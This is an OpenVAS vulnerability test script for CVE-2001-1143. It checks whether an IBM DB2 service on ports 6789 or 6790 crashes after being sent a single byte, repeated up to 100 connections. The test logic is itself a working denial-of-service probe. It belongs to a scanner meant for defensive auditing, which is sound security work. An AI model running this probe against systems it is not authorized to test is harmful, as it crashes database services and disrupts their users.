###############################################################################
# OpenVAS Vulnerability Test
#
# DB2 DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>, starting
# from miscflood.nasl
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10871");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3010);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2001-1143");
  script_name("DB2 DOS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(6789, 6790);

  script_tag(name:"solution", value:"Upgrade your software.");

  script_tag(name:"summary", value:"It was possible to crash the DB2 database by sending just one byte to it.");

  script_tag(name:"impact", value:"An attacker may use this attack to make this service crash continuously, preventing you
  from working properly.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

function test_db2_port( port ) {

  if( ! get_port_state( port ) )
    return;

  soc = open_sock_tcp( port );
  if( ! soc )
    return;

  for( i = 0; i < 100; i++ ) {

    send( socket:soc, data:string( "x" ) );
    close( soc );

    soc = open_sock_tcp( port );
    if( ! soc ) {
      sleep( 1 );
      soc = open_sock_tcp( port );
      if( ! soc ) {
        security_message( port:port );
        return;
      }
    }
  }
  close( soc );
  return;
}

test_db2_port( port:6789 );
test_db2_port( port:6790 );